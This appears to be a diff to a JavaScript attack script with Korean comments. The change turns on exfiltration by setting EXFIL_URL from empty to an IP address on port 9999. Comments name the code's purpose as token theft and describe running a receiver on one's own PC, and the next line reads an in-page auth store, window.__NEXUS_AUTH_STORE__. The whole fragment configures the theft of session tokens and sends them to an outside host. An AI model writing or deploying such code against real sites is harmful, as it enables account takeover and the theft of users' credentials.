@@ -11,7 +11,7 @@
   // CONFIG — 수신 서버 URL (본인 PC에서 receiver 실행)
   // 수신 안 할 거면 빈 문자열로 두세요 — 화면 표시만 됩니다
   // ============================================
-  var EXFIL_URL = '';
+  var EXFIL_URL = 'http://172.29.70.161:9999';
 
   // 토큰 탈취
   var store = window.__NEXUS_AUTH_STORE__;
